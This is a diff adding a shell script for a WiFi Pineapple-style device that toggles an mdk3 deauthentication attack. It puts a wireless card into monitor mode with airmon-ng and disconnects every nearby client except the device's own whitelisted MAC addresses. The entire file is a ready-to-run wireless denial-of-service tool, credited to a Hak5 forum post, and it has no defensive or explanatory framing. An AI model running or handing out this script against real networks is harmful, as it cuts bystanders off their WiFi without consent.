@@ -1,0 +1,43 @@
+#!/bin/sh
+echo ==========================================================================
+echo Actually this script is created by raldnor
+echo I just mod it, u can find it here 
+echo http://forums.hak5.org/index.php?/topic/28926-occupineapple-button-script/
+echo ==========================================================================
+
+GENLIST=`cat /etc/config/wireless | grep 'macaddr' | awk '{print $3}' > /root/whitelist`
+THELIST=/root/whitelist
+
+sleep 1
+
+if [ "$(pidof mdk3)" ]
+then
+ logger "Disruptor is running, killing it now..."
+ kill $(pidof mdk3)
+ if grep -q mon0 /proc/net/dev
+ then
+  logger "Monitor interface up, bringing it down..."
+  airmon-ng stop mon0
+ fi
+ logger "Done."
+else
+ logger "Disruptor not running, starting now..."
+ if grep -q mon0 /proc/net/dev
+ then 
+  logger "Monitor mode active..."
+ else
+  logger "Monitor mode not active, starting now..."
+  if grep -q wlan1 /proc/net/dev
+  then
+   airmon-ng start wlan1 &
+   logger "airmon-ng start in wlan1"
+  else
+   airmon-ng start wlan0 &
+   logger "airmon-ng start in wlan0"
+  fi
+ fi
+ logger "Starting MDK3..."
+ sleep 1
+ mdk3 mon0 d -w $THELIST &
+ logger "Disruptor active! Bailing out!"
+fi
